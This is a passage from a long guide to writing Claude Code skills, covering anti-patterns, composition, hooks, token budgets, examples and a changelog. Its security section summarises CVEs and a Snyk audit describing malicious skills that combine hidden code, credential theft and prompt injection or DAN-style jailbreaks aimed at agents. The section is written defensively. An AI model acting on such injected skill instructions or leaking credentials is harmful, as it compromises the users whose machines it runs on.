6. **API Testing** — Contract testing, rate limiting validation, error scenario coverage

### DevOps & Infrastructure

7. **Kubernetes Deployment** — Security contexts, resource limits, probes, pod disruption budgets
8. **CI/CD Pipeline Design** — SAST (CodeQL, Semgrep), DAST (OWASP ZAP), SCA (Snyk), secret scanning
9. **AWS/GCP Cost Optimization** — Reserved instances, spot instances, resource right-sizing
10. **Container Security** — Trivy scanning, SBOM generation, image signing
11. **Multi-region failover** — Replication strategy, DNS failover, data consistency checks

### Documentation & Content

12. **Technical Writing** — Style guide, terminology consistency, audience-specific explanations
13. **API Documentation** — Auto-generate from schemas, enforce example coverage
14. **Architecture Decision Records** — Template with Context, Decision, Consequences, Alternatives
15. **Release Notes Generation** — Categorize commits, link issues, version numbering

### Data & ML

16. **Data Science Workflows** — Hypothesis testing, power analysis, data cleaning, visualization
17. **ML Model Evaluation** — Cross-validation, metric thresholds, confusion matrix, fairness checks
18. **BigQuery Analysis** — Table schemas, filtering rules, common query patterns by domain
19. **Data Pipeline Validation** — Schema enforcement, null handling, outlier detection

### Security & Compliance

20. **Secrets Management** — Detection patterns, rotation procedures, audit logging
21. **HIPAA/SOC2 Compliance** — Data residency rules, encryption requirements, access control
22. **Supply Chain Security** — Dependency audit, license compliance, vulnerability disclosure

### Frontend & Design

23. **Design System Compliance** — Component API conventions, spacing, color, accessibility (WCAG AA)
24. **React/Vue Component Patterns** — Naming conventions, hook rules, composition patterns

### Business & Workflows

25. **Customer Escalation Response** — Phone agent context, response templates, playbook navigation
26. **Content Calendar Planning** — 30-day planning with hashtag strategy, engagement hooks

### Visual Output & Reports

27. **Codebase Visualization** — Interactive tree views, dependency graphs
28. **Test Coverage Reports** — Interactive HTML reports, trend analysis

---

## 21. Anti-Patterns: What NOT to Do

### Content Anti-Patterns

1. **Kitchen-sink SKILL.md** — Too many instructions = Claude ignores half. Keep under 500 lines
2. **Weak descriptions** — "Helps with documents" won't trigger. Need specific constraints and output description
3. **Voodoo constants** — Scripts with magic numbers. Comment every constant
4. **Time-sensitive information** — Don't include "Use this before August 2025." Use "Old patterns" sections
5. **Inconsistent terminology** — Don't mix "API endpoint", "URL", "API route". Choose one term
6. **Over-specified descriptions** — 3+ explicit constraints and expected output needed
7. **Too many options** — Confuses Claude. Provide default + escape hatch

### Structure Anti-Patterns

8. **Deeply nested file references** — Claude partially reads 2+ levels deep. Keep one level from SKILL.md
9. **Monolithic SKILL.md (5,000+ lines)** — Claude reads entire file. Split into overview + supporting files
10. **Windows-style paths** — Use forward slashes (`scripts/helper.py`), not backslashes
11. **Skill-to-skill coupling** — Don't require other skills. They're stateless
12. **Assuming tools are installed** — Always show install instructions

### Configuration Anti-Patterns

13. **Loading 100+ skills globally** — Slow startup, budget warnings. Use project-scoped
14. **Ignoring context budget** — 2% of context window. Many skills = some excluded. Check `/context`
15. **Updating skills during active session** — Changes may not pick up (hot-reload added in v2.1.0 for `--add-dir` skills, but project skills may still need restart)
16. **Vague activation triggers** — Descriptions must include specific keywords Claude will naturally say

### Development Anti-Patterns

17. **One-shot without iteration** — 2-3 feedback cycles increase quality by 40%
18. **Missing atomic task breakdown** — One mega-task instead of 5-10 minute blocks
19. **Punting error handling** — Scripts should handle errors, not fail and let Claude figure it out
20. **Multiple equally-valid options** — Confuses Claude. Provide default + escape hatch

---

## 22. Skills for Agent Teams

### How Skills Work with Teams

- Teammates load the same project context (CLAUDE.md, MCP servers, **and all skills**)
- All agents can see task status and claim work from shared task list
- Skills descriptions visible to all teammates for automatic triggering
- Skills are not team-exclusive: if one teammate loads a skill, others don't duplicate

### Team Skill Patterns

**Research + Review Split:**
- Lead: Coordinates task assignments
- Research teammate: Uses domain-research skill
- Review teammate: Uses security-review + code-review skills

**Feature Development Across Layers:**
- Frontend: Uses react-patterns, design-tokens skills
- Backend: Uses api-conventions, database-migration skills
- DevOps: Uses kubernetes, ci-cd skills

**Parallel Hypothesis Testing:**
- Hypothesis A: Uses debugging-approach-1 skill
- Hypothesis B: Uses debugging-approach-2 skill
- Compare results → Lead approves fix

### Team Best Practices

1. Skill descriptions must be crystal clear for auto-detection
2. Default to read-only tools to prevent file conflicts between teammates
3. Keep skills independent — can't guarantee another skill loaded
4. Consistent naming across team
5. Document skill constraints in descriptions

---

## 23. Skills vs Agents: When to Use Which

| Decision Factor | Use Skill | Use Agent |
|-----------------|-----------|-----------|
| **Scope** | Add knowledge to current context | Delegate entire task to separate context |
| **Reusability** | Across many conversations | Task-specific investigation |
| **Information** | Domain expertise, patterns | Complex, isolated task |
| **Context isolation** | Not needed; inline | Critical; prevent context bloat |
| **Invocation** | Auto-trigger or manual `/skill-name` | Explicit delegation |
| **Feedback** | Integrated in main conversation | Summarized results returned |

---

## 24. Skill Composition

### Important: Skills are stateless and don't directly call other skills

**Pattern: Reference-based composition**
```yaml
---
name: full-deployment
---

This workflow uses multiple skills:
1. Preparation: Use `/security-code-review` to audit changes
2. Testing: Use `/test-driven-development` for test coverage
3. Deployment: Use `/deploy-kubernetes` to deploy
4. Verification: Use `/monitoring-setup` to verify metrics
```

### Composition Rules

1. Don't embed skill invocations in SKILL.md — reference, don't invoke
2. Document the skill sequence if order matters
3. Keep skills independent — each works standalone
4. Use CLAUDE.md for meta-workflows that always apply

### Skills + Hooks + MCP

Skills can be combined with hooks for automation:
```json
{
  "hooks": {
    "PostToolUse": [{
      "matcher": ".*commit.*",
      "hooks": [{
        "type": "command",
        "command": "cd $CLAUDE_PROJECT_DIR && npm test"
      }]
    }]
  }
}
```

Skills can reference MCP tools:
```yaml
---
name: github-issue-fixer
---
1. Fetch issue: Use GitHub:get_issue tool
2. Implement fix
3. Create PR: Use GitHub:create_pull_request tool
```

---

## 25. Performance Considerations

### How Skills Consume Tokens

1. **Metadata loading (always)**: ~100 tokens per skill at startup. 100+ skills = ~10,000 tokens baseline
2. **SKILL.md loading (on trigger)**: Under 5,000 tokens. Happens once per trigger
3. **Reference file loading (on demand)**: Only what's read. 10MB reference takes 0 tokens until accessed
4. **Script execution**: Code never enters context. Only output consumes tokens

### Context Window Budget

Claude Code has a 200K token context window. System prompts, tool definitions, MCP schemas, and memory files consume 30,000-40,000 tokens before you type anything. Adding MCP servers drops that to 120K-130K.

### Optimization Strategies

- **Aggressive progressive disclosure**: Keep SKILL.md under 500 lines (~2,000 tokens). Split large content into domain-specific files
- **Budget management**: 2% of context window, fallback 16k chars. Override: `SLASH_COMMAND_TOOL_CHAR_BUDGET=32000`
- **Smart skill selection**: Use `disable-model-invocation: true` for low-trigger skills. Use `user-invocable: false` for background knowledge. Use project-scoped over global
- **Context compaction**: Auto-compact at 64-75% capacity with a completion buffer. Manually compact at 70-80% for optimal quality/cost
- **Script over code generation**: Pre-made scripts save tokens and time vs Claude generating equivalent code

### Performance Anti-Patterns

- **Loading 100+ skills globally** — Slow startup, budget warnings. Use project-scoped
- **Monolithic SKILL.md (5,000+ lines)** — Claude reads entire file. Split into overview + supporting files
- **Updating skills during active session** — Changes may not pick up until next session
- **Deeply nested reference files** — Claude partially reads. Keep one level deep

---

## 26. Naming Conventions & Description Writing

### Naming

- **Recommended**: Gerund form — `processing-pdfs`, `analyzing-data`, `reviewing-code`
- **Acceptable**: Noun phrases — `pdf-processing`, `data-analysis`, `code-review`
- **Acceptable**: Action-oriented — `process-pdfs`, `analyze-spreadsheets`
- **Avoid**: Vague (`helper`, `utils`, `tools`), generic (`documents`, `data`, `files`)
- **Avoid**: Reserved words (`anthropic-*`, `claude-*`)
- **Constraint**: Max 64 chars, lowercase + numbers + hyphens only, no XML tags

### Description Writing (Critical for Auto-Trigger)

**Structure**: "What it does" + "When to use it"

**Bad:**
```yaml
description: Helps with documents
description: Code review skill
description: Processes data
description: Does stuff with files
```

**Good:**
```yaml
description: Extract text and tables from PDF files, fill forms, merge documents. Use when working with PDF files or when the user mentions PDFs, forms, extraction, or merging.
description: OWASP Top 10:2025 and ASVS 5.0 vulnerability detection. Use when reviewing code for security, auditing compliance, or assessing authentication.
description: Analyze Excel spreadsheets, create pivot tables, generate charts. Use when analyzing Excel files, spreadsheets, tabular data, or .xlsx files.
description: Generate descriptive commit messages by analyzing git diffs. Use when the user asks for help writing commit messages or reviewing staged changes.
```

**Key principles:**
1. Write in third person ("Processes Excel files" not "I help with Excel")
2. Include specific keywords users naturally say
3. Mention decision triggers ("Use when working with...", "Use for...")
4. Test with real prompts — will Claude naturally match these keywords?
5. Maximum 1024 characters, no XML tags

---

## 27. Workflow Patterns

### Checklist Pattern

From Anthropic best practices — for complex workflows, provide a checklist Claude can copy and track:

```markdown
## Research synthesis workflow

Copy this checklist and track your progress:

Research Progress:
- [ ] Step 1: Read all source documents
- [ ] Step 2: Identify key themes
- [ ] Step 3: Cross-reference claims
- [ ] Step 4: Create structured summary
- [ ] Step 5: Verify citations
```

### Feedback Loop Pattern

Run validator → fix errors → repeat. This greatly improves output quality.

```markdown
## Document editing process

1. Make your edits to word/document.xml
2. Validate immediately: python scripts/validate.py unpacked_dir/
3. If validation fails:
   - Review the error message carefully
   - Fix the issues
   - Run validation again
4. Only proceed when validation passes
5. Rebuild: python scripts/pack.py unpacked_dir/ output.docx
```

### Conditional Workflow Pattern

Guide Claude through decision points:

```markdown
## Document modification workflow

1. Determine the modification type:
   Creating new content? → Follow "Creation workflow" below
   Editing existing content? → Follow "Editing workflow" below

2. Creation workflow: Use docx-js, build from scratch, export
3. Editing workflow: Unpack, modify XML, validate, repack
```

### Template Pattern

For strict requirements (API responses, data formats):
```markdown
ALWAYS use this exact template structure:
# [Analysis Title]
## Executive summary
## Key findings
## Recommendations
```

For flexible guidance:
```markdown
Here is a sensible default format, but use your best judgment:
```

### Examples Pattern

Provide input/output pairs:
```markdown
Example 1:
Input: Added user authentication with JWT tokens
Output: feat(auth): implement JWT-based authentication

Example 2:
Input: Fixed bug where dates displayed incorrectly
Output: fix(reports): correct date formatting in timezone conversion
```

---

## 28. Security Considerations

### CVE Impact on Skills

**CVE-2025-59536**: Code injection vulnerability — hooks and MCP servers in `.claude/settings.json` (project-level, repo-controlled) executed shell commands on any collaborator's machine without permission. Skills with hooks in frontmatter could be attack vectors. Fixed in v1.0.111 (October 2025).

**CVE-2026-21852**: Information disclosure — malicious `ANTHROPIC_BASE_URL` in project settings could redirect API requests, leaking API keys. Fixed in v2.0.65 (January 2026).

**CVE-2026-24887**: Command injection in find command bypasses user approval prompt. Affects Claude Code skill execution.

### Snyk ToxicSkills Audit (February 2026)

The first comprehensive security audit of the AI Agent Skills ecosystem, analyzing **3,984 skills** from ClawHub and skills.sh.

**Critical Findings:**
- **13.4%** of skills (534 total) contain at least one **critical-level** security issue
- **36.82%** of the ecosystem (1,467 skills) have security flaws of **any** severity
- **76** confirmed malicious payloads through human-in-the-loop review
- **8** malicious skills remained publicly available at publication

**Eight-Category Threat Taxonomy:**

| # | Category | Severity | Prevalence |
|---|----------|----------|------------|
| 1 | Prompt Injection (base64, Unicode, jailbreaks) | CRITICAL | Found in 91% of malicious skills |
| 2 | Malicious Code (backdoors, RCE, credential theft) | CRITICAL | Found in 100% of malicious skills |
| 3 | Suspicious Downloads (malware, password-protected archives) | CRITICAL | Active distribution observed |
| 4 | Credential Handling (insecure secrets) | HIGH | Common pattern |
| 5 | Secret Detection (hardcoded API keys) | HIGH | **10.9% of all skills** |
| 6 | Third-Party Content Exposure (untrusted fetching) | MEDIUM | **17.7% of all skills** |
| 7 | Unverifiable Dependencies (curl \| bash) | MEDIUM | 2.9% of all skills |
| 8 | Direct Money Access (financial system integration) | MEDIUM | Observed |

**Critical Convergence:** "100% of confirmed malicious skills contain malicious code patterns, while 91% simultaneously employ prompt injection techniques" — a novel threat model combining traditional malware with natural language attacks.

**Supply Chain Risks:**
- Skills inherit full agent permissions (shell access, file system control, credential access)
- Minimal publishing barriers: only a Markdown file and week-old GitHub account required
- Persistent memory modification enabling long-term compromise
- Ecosystem experiencing hypergrowth: daily submissions increased from <50 to >500 in weeks

### Security Best Practices

1. **Audit thoroughly**: Review ALL files (SKILL.md, scripts, images, resources). Look for unusual network calls, file access patterns, or operations that don't match stated purpose
2. **External sources are risky**: Skills fetching external URLs can be compromised if dependencies change
3. **Tool misuse**: Malicious skills can invoke tools (file ops, bash, code execution) in harmful ways
4. **Data exposure**: Skills with access to sensitive data could leak information
5. **Treat like installing software**: Only use Skills from trusted sources
6. **Use `allowed-tools`** to limit skill capabilities
7. **Combine deny rules with PreToolUse hooks** for reliable blocking
8. **Review before deploying** community skills — 13.4% have critical issues

### Identified Threat Actors (from Snyk)

- **zaycv**: 40+ skills with automated malware generation patterns
- **Aslaep123**: Typosquatted trading/crypto-targeting skills
- **aztr0nutzs**: Ready-to-deploy malicious skills repository
- **pepe276, moonshine-100rze**: Unicode contraband injection and DAN-style jailbreaks

---

## 29. Known Issues (GitHub)

### Skills Discovery and Loading

| Issue | Title | Status |
|-------|-------|--------|
| [#9716](https://github.com/anthropics/claude-code/issues/9716) | Claude not aware of available skills in .claude/skills/ directory | Open |
| [#14577](https://github.com/anthropics/claude-code/issues/14577) | /skills command shows "No skills found" despite skills being loaded | Open |
| [#14882](https://github.com/anthropics/claude-code/issues/14882) | Skills consume full token count at startup instead of progressive disclosure (frontmatter only) | Open |
| [#25072](https://github.com/anthropics/claude-code/issues/25072) | Skills not loading from ~/.claude/skills/ directory | Open |
| [#10568](https://github.com/anthropics/claude-code/issues/10568) | Marketplace Skills not exposed through Skill tool | Open |
| [#24156](https://github.com/anthropics/claude-code/issues/24156) | keybindings-help skill always loaded even when CLI options forbid it | Open |

### Platform-Specific Issues

| Issue | Title | Status |
|-------|-------|--------|
| [#26998](https://github.com/anthropics/claude-code/issues/26998) | Skills not saving/loading on Windows 11, user skills directory empty | Open |
| [#26254](https://github.com/anthropics/claude-code/issues/26254) | User/Org Skills — Metadata registered but SKILL.md files not mounted in container | Open |
| [#26131](https://github.com/anthropics/claude-code/issues/26131) | Cowork skills bug — 36 skills registered but none appear at runtime | Open |

### Worktree and Context Issues

| Issue | Title | Status |
|-------|-------|--------|
| [#27985](https://github.com/anthropics/claude-code/issues/27985) | Skills always load from repo root instead of worktree's working directory | Open |
| [#17283](https://github.com/anthropics/claude-code/issues/17283) | Feature request: Skill tool should honor `context: fork` and `agent:` frontmatter fields | Open |

### Key Gotcha: Progressive Disclosure Bug (#14882)

Issue #14882 reports that skills consume the full token count at startup instead of progressive disclosure (frontmatter only). This means the documented behavior (only metadata loaded at startup) may not work as expected in all cases. Worth monitoring.

---

## 30. Executable Scripts in Skills

### Benefits of Utility Scripts

From Anthropic best practices:
- **More reliable** than generated code
- **Save tokens** (no need to include code in context)
- **Save time** (no code generation required)
- **Ensure consistency** across uses

### Script vs Reference

Make clear in instructions whether Claude should:
- **Execute the script** (most common): "Run `analyze_form.py` to extract fields"
- **Read it as reference** (for complex logic): "See `analyze_form.py` for the extraction algorithm"

For most utility scripts, execution is preferred because it's more reliable and efficient.

### Error Handling in Scripts

**Good: Handle errors explicitly:**
```python
def process_file(path):
    try:
        with open(path) as f:
            return f.read()
    except FileNotFoundError:
        print(f"File {path} not found, creating default")
        with open(path, "w") as f:
            f.write("")
        return ""
```

**Bad: Punt to Claude:**
```python
def process_file(path):
    return open(path).read()  # Just fail and let Claude figure it out
```

### Self-Documenting Constants

```python
# Good: Self-documenting
REQUEST_TIMEOUT = 30  # HTTP requests typically complete within 30s
MAX_RETRIES = 3       # Most intermittent failures resolve by 2nd retry

# Bad: Magic numbers
TIMEOUT = 47  # Why 47?
RETRIES = 5   # Why 5?
```

### Verifiable Intermediate Outputs

For complex tasks, use the "plan-validate-execute" pattern:

1. Analyze → create plan file (`changes.json`)
2. Validate plan with script
3. Execute only when validation passes
4. Verify output

This catches errors early, is machine-verifiable, and provides clear debugging.

### Package Dependencies

Runtime environment varies by platform:
- **Claude.ai**: Can install packages from npm/PyPI and pull from GitHub
- **Claude API**: No network access, no runtime installation — pre-configured only
- **Claude Code**: Full network access, but avoid global package installation

---

## 31. Complete Examples

### Simple Reference Skill (Auto-Invoked)

```yaml
---
name: api-conventions
description: API design patterns for this codebase. Use when writing API endpoints or discussing API design.
---

When writing API endpoints:
- Use RESTful naming conventions
- Return consistent error formats: { ok: true/false, error?, code? }
- Include request validation with zod
- Use snake_case for JSON fields
```

### Task Skill (User-Only)

```yaml
---
name: deploy
description: Deploy the application to production
disable-model-invocation: true
---

Deploy $ARGUMENTS to production:
1. Run the test suite
2. Build the application
3. Push to the deployment target
4. Verify the deployment succeeded
```

### Read-Only Analysis

```yaml
---
name: security-audit
description: Audit code for security vulnerabilities. Use when reviewing code for security or assessing authentication.
allowed-tools: Read, Grep, Glob, Bash(npm audit)
context: fork
agent: Explore
---

Audit the codebase for security issues:
1. Check for OWASP Top 10 vulnerabilities
2. Review authentication and authorization patterns
3. Scan for hardcoded secrets
4. Report findings with severity levels
```

### Dynamic Context Injection

```yaml
---
name: pr-copilot
description: Help with pull request description
context: fork
agent: Explore
allowed-tools: Bash(gh *)
---

## PR Context
- **Diff**: !`gh pr diff`
- **Changed files**: !`gh pr diff --name-only`

Write a clear, concise PR description...
```

### Skill with Supporting Files

```
pdf-processing/
├── SKILL.md              # Main instructions
├── FORMS.md              # Form-filling guide
├── reference.md          # API reference
└── scripts/
    ├── analyze_form.py   # Extract form fields
    ├── fill_form.py      # Apply values to PDF
    └── validate.py       # Validation script
```

### Skill with Hooks

```yaml
---
name: secure-operations
description: Perform operations with security checks
hooks:
  PreToolUse:
    - matcher: "Bash"
      hooks:
        - type: command
          command: "./scripts/security-check.sh"
          once: true
---
```

### Domain-Specific BigQuery Skill

```yaml
---
name: bigquery-analysis
description: Analyze data in BigQuery. Use when the user asks about revenue, sales pipeline, or product metrics.
---

## Available datasets

**Finance**: Revenue, ARR, billing → See [reference/finance.md](reference/finance.md)
**Sales**: Opportunities, pipeline → See [reference/sales.md](reference/sales.md)
**Product**: API usage, features → See [reference/product.md](reference/product.md)

## Rules
- ALWAYS filter out test accounts (account_id != 'test-*')
- Use UTC timestamps
- Include date range in WHERE clause
```

---

## 32. Debugging Skills

### Skill Not Triggering

1. Check description includes keywords users would naturally say
2. Verify it appears when asking "What skills are available?"
3. Try rephrasing your request to match the description more closely
4. Invoke directly with `/skill-name`
5. Description too vague? Make it more specific
6. Too many skills? May be excluded from context budget — run `/context`

### Skill Triggers Too Often

1. Description too generic? Make it more specific
2. Add `disable-model-invocation: true`
3. Rephrase description to avoid broad keywords

### Claude Doesn't See All Skills

Override character budget:
```bash
export SLASH_COMMAND_TOOL_CHAR_BUDGET=32000
claude
```

### Observing How Claude Uses Skills

Watch for:
- **Unexpected exploration paths**: Claude reads files in unanticipated order
- **Missed connections**: Claude doesn't follow references — make links more explicit
- **Overreliance on sections**: If Claude repeatedly reads the same file, consider putting that content in SKILL.md
- **Ignored content**: If Claude never accesses a bundled file, it might be unnecessary

### Permission Prompts in Skills

Subagents don't inherit parent permissions. Use `allowed-tools` to pre-approve specific commands.

---

## 33. Migrating Commands to Skills

### From

```
.claude/commands/my-command.md
```

### To

```
.claude/skills/my-command/
└── SKILL.md
```

### Steps

1. Create `.claude/skills/my-command/SKILL.md`
2. Add frontmatter (name, description, any new fields)
3. Copy content from command file
4. Optionally add supporting files
5. Delete `.claude/commands/my-command.md`

---

## 34. Decision Matrix

| Use Case | Best Tool | Why |
|----------|-----------|-----|
| Reusable knowledge | CLAUDE.md or Skill | Always in context or on-demand |
| Manual workflow (/deploy) | Skill (`disable-model-invocation: true`) | User-controlled |
| Auto-triggered helper | Skill (default) | Claude detects relevance |
| Background reference | Skill (`user-invocable: false`) | Claude knows about it, not a command |
| Complex isolated research | Skill (`context: fork`) | Verbose output stays isolated |
| Tool-restricted task | Skill (`allowed-tools`) | Enforced constraints |
| Parallel work | Agent Teams | Each gets own context |
| Dynamic preprocessing | Skill with backticks `!`cmd`` | Runs once at load time |
| Guaranteed execution | Hook | Not dependent on Claude's judgment |
| Large-scale parallel changes | `/batch` bundled skill | Worktree-isolated agents |

---

## 35. Real-World Production Repos

### 1. [anthropics/skills](https://github.com/anthropics/skills)
Official Anthropic skills repository. Contains the `skill-creator` skill — a meta-skill for creating new skills.

### 2. [travisvn/awesome-claude-skills](https://github.com/travisvn/awesome-claude-skills)
65+ production skills. Curated collection with categories covering development, DevOps, documentation, data analysis, and more.

### 3. [ComposioHQ/awesome-claude-skills](https://github.com/ComposioHQ/awesome-claude-skills)
Curated production skills with focus on tool integrations and MCP server patterns.

### 4. [levnikolaevich/claude-code-skills](https://github.com/levnikolaevich/claude-code-skills)
65+ full-stack skills covering React, Node, Python, Go, Kubernetes, and more.

### 5. [daymade/claude-code-skills](https://github.com/daymade/claude-code-skills)
Professional skills marketplace with quality-focused curation.

### 6. [hesreallyhim/awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code)
Comprehensive collection: skills + hooks + agents + plugins.

### 7. [ubie-oss/claude-code-plugin](https://github.com/ubie-oss/claude-code-plugin)
Claude Code plugin with skills for agent workflows.

### 8. [VoltAgent/awesome-claude-code-subagents](https://github.com/VoltAgent/awesome-claude-code-subagents)
100+ specialized subagents, many with skill integration patterns.

### 9. [shanraisshan/claude-code-best-practice](https://github.com/shanraisshan/claude-code-best-practice)
Best practice reports including skills for larger monorepos and token budget management.

### 10. [diet103/claude-code-infrastructure-showcase](https://github.com/diet103/claude-code-infrastructure-showcase)
Production-tested infrastructure from 6 months managing a complex TypeScript microservices project. 5 production skills with auto-activation, 6 hooks, 10 specialized agents.

### Skills Marketplaces

- **ClawHub** — Community skill registry (**SHUT DOWN** Feb 2026 — ClawHavoc malware campaign, 341+ malicious skills)
- **skills.sh** — Curated skill registry (top-100 verified for 0% false positives by Snyk)
- **claudemarketplaces.com** — Plugin and skill marketplace
- **mcpmarket.com** — Skills alongside MCP tools

---

## 36. Official Documentation Quotes & Design Philosophy

### From the Skills Documentation

> "Skills extend what Claude can do. Create a SKILL.md file with instructions, and Claude adds it to its toolkit. Claude uses skills when relevant, or you can invoke one directly with /skill-name."

> "Claude Code skills follow the Agent Skills open standard, which works across multiple AI tools. Claude Code extends the standard with additional features like invocation control, subagent execution, and dynamic context injection."

> "context: fork only makes sense for skills with explicit instructions. If your skill contains guidelines like 'use these API conventions' without a task, the subagent receives the guidelines but no actionable prompt, and returns without meaningful output."

### From the Anthropic Engineering Blog

> "Skills implement a three-tier information hierarchy that starts with a table of contents, then specific chapters, and finally a detailed appendix."

> "Sorting a list via token generation is far more expensive than simply running a sorting algorithm." — On why scripts in skills are more efficient than generated code.

> "Identify specific gaps in your agents' capabilities by running them on representative tasks and observing where they struggle." — Evaluation-first approach.

> "Ask Claude to capture its successful approaches and common mistakes into reusable context and code within a skill." — Iterative refinement.

### From the Best Practices Guide

> "The context window is a public good. Your Skill shares the context window with everything else Claude needs to know."

> "Claude models understand the Skill format and structure natively. You don't need special system prompts or a 'writing skills' skill to get Claude to help create Skills."

> "Default assumption: Claude is already very smart. Only add context Claude doesn't already have."

### From the Snyk ToxicSkills Study

> "Agent Skills are a software supply chain, and they require the same security rigor we apply to npm, PyPI, and container registries."

> "100% of confirmed malicious skills contain malicious code patterns, while 91% simultaneously employ prompt injection techniques."

### From Community Research

> "Premature context saturation occurs when exhaustive system prompts attempt to cover every edge case, paradoxically degrading performance on common tasks as signal drowns in the noise." — Glen Rhodes

> "Agents struggled not because they lacked capability but because they lacked well-scoped, properly structured instructions." — Citing Andrej Karpathy

---

## 37. Version History & Changelog

### v2.1.69 (March 2026) — Latest
- **`${CLAUDE_SKILL_DIR}` variable**: Skills can reference their own directory in SKILL.md content
- **`InstructionsLoaded` hook event**: Fires when CLAUDE.md or `.claude/rules/*.md` files load into context
- **Security fix**: Nested skill discovery no longer loads from gitignored directories (e.g., `node_modules`)
- **Fix**: Skill descriptions with colons in YAML (e.g., `"Triggers include: X, Y, Z"`) no longer fail to load
- **Fix**: Skills without `description:` field now appear in Claude's available skills list
- **Fix**: `--setting-sources user` now properly blocks dynamically discovered project skills
- **Fix**: Duplicate skills/CLAUDE.md/agents/rules in worktrees nested inside main repos

### v2.1.51
- **Fix**: Slash command autocomplete crash when SKILL.md description is a YAML array (non-string type)

### v2.1.50
- **`CLAUDE_CODE_SIMPLE` mode**: Strips skills, session memory, custom agents, and CLAUDE.md token counting

### v2.1.0 (January 2026)
- **Skill hot-reload**: Edit skills from `--add-dir` directories without restart
- **`context: fork`** for isolated execution
- **MCP `list_changed` notifications** support

### v2.0.56 / v2.0.65
- **Permission regressions**: Deny rules have regressions. Combine with PreToolUse hooks for reliable blocking

### v1.0.111 (October 2025)
- **CVE-2025-59536 fix**: Project-level hooks no longer auto-execute without permission

### Agent Skills Standard
- Skills follow the [Agent Skills](https://agentskills.io) open standard
- Cross-platform: Claude.ai, Claude Code, Claude Agent SDK, Claude API
- Pre-built skills available: PowerPoint (pptx), Excel (xlsx), Word (docx), PDF (pdf)

---

## 38. Checklist for Effective Skills

### Core Quality
- [ ] Description is specific and includes key terms (what + when)
- [ ] Description written in third person
- [ ] Description under 1024 characters, no XML tags
- [ ] SKILL.md body under 500 lines
- [ ] Additional details in separate files (if needed)
- [ ] No time-sensitive information
- [ ] Consistent terminology throughout
- [ ] Examples are concrete, not abstract
- [ ] File references one level deep
- [ ] Progressive disclosure used appropriately
- [ ] Workflows have clear steps

### Code and Scripts
- [ ] Scripts solve problems rather than punt to Claude
- [ ] Error handling explicit and helpful
- [ ] No magic numbers (all values justified)
- [ ] Required packages listed and verified
- [ ] No Windows-style paths (all forward slashes)
- [ ] Validation/verification steps for critical operations
- [ ] Feedback loops for quality-critical tasks

### Testing
- [ ] At least three evaluations created
- [ ] Tested with Haiku, Sonnet, and Opus
- [ ] Tested with real usage scenarios
- [ ] Team feedback incorporated

### Security
- [ ] No hardcoded secrets or API keys
- [ ] No fetching from untrusted external URLs
- [ ] `allowed-tools` restricts to minimum necessary
- [ ] Scripts audited for malicious patterns
- [ ] Dependencies verified and documented

---

## Sources

### Official Documentation
- [Extend Claude with Skills — Claude Code Docs](https://code.claude.com/docs/en/skills)
- [Agent Skills Overview — Claude API Docs](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview)
- [Skill Authoring Best Practices — Claude API Docs](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices)
- [Best Practices for Claude Code](https://code.claude.com/docs/en/best-practices.md)
- [Features Overview](https://code.claude.com/docs/en/features-overview.md)
- [Sub-agents](https://code.claude.com/docs/en/sub-agents.md)
- [Agent Teams](https://code.claude.com/docs/en/agent-teams.md)
- [Memory Management](https://code.claude.com/docs/en/memory.md)
- [Reduce Token Usage](https://code.claude.com/docs/en/costs.md#reduce-token-usage)
- [Introducing Agent Skills — Anthropic](https://www.anthropic.com/news/skills)
- [Equipping Agents for the Real World — Anthropic Engineering](https://claude.com/blog/equipping-agents-for-the-real-world-with-agent-skills)
- [The Complete Guide to Building Skills for Claude (PDF)](https://resources.anthropic.com/hubfs/The-Complete-Guide-to-Building-Skill-for-Claude.pdf)
- [Official Anthropic Skills Repo](https://github.com/anthropics/skills)
- [Claude Code Skill Development Plugin](https://github.com/anthropics/claude-code/blob/main/plugins/plugin-dev/skills/skill-development/SKILL.md)

### Security Research
- [Snyk ToxicSkills — Malicious Agent Skills Supply Chain Study](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [Check Point Research — RCE and API Token Exfiltration (CVE-2025-59536 / CVE-2026-21852)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [Lasso Security — Detecting Indirect Prompt Injection in Claude Code](https://www.lasso.security/blog/the-hidden-backdoor-in-claude-coding-assistant)
- [PromptArmor — Claude Cowork Exfiltrates Files](https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files)
- [CVE-2026-24887 — Claude Code Command Injection](https://github.com/advisories/GHSA-qgqw-h4xq-7w8w)

### Community Resources & Repos
- [awesome-claude-skills — travisvn](https://github.com/travisvn/awesome-claude-skills) — 65+ production skills
- [awesome-claude-code — hesreallyhim](https://github.com/hesreallyhim/awesome-claude-code) — Skills + hooks + agents + plugins
- [awesome-claude-skills — ComposioHQ](https://github.com/ComposioHQ/awesome-claude-skills) — Curated production skills
- [claude-code-skills — levnikolaevich](https://github.com/levnikolaevich/claude-code-skills) — 65+ full-stack skills
- [claude-code-skills — daymade](https://github.com/daymade/claude-code-skills) — Professional marketplace
- [awesome-claude-code-subagents — VoltAgent](https://github.com/VoltAgent/awesome-claude-code-subagents) — 100+ specialized subagents
- [claude-code-best-practice — shanraisshan](https://github.com/shanraisshan/claude-code-best-practice) — Token budget management
- [claude-code-infrastructure-showcase — diet103](https://github.com/diet103/claude-code-infrastructure-showcase) — Production-tested infrastructure

### Articles & Blog Posts
- [VentureBeat: How Anthropic's Skills Make Claude Faster, Cheaper, More Consistent](https://venturebeat.com/technology/how-anthropics-skills-make-claude-faster-cheaper-and-more-consistent-for)
- [Dev.to: The Age of Skills Has Begun](https://dev.to/miaoshuyo/the-age-of-skills-has-begun-why-prompts-are-fading-fast-in-2026-2e3f)
- [Towards Data Science: Claude Skills and Subagents](https://towardsdatascience.com/claude-skills-and-subagents-escaping-the-prompt-engineering-hamster-wheel/)
- [Lee Han Chung: Claude Agent Skills Deep Dive](https://leehanchung.github.io/blogs/2025/10/26/claude-skills-deep-dive/)
- [Pulumi: The Claude Skills I Actually Use for DevOps](https://www.pulumi.com/blog/top-8-claude-skills-devops-2026/)
- [SFEIR Institute: Advanced Best Practices & Common Mistakes](https://institute.sfeir.com/en/claude-code/claude-code-advanced-best-practices/)
- [SFEIR Institute: Custom Commands and Skills](https://institute.sfeir.com/en/claude-code/claude-code-custom-commands-and-skills/)
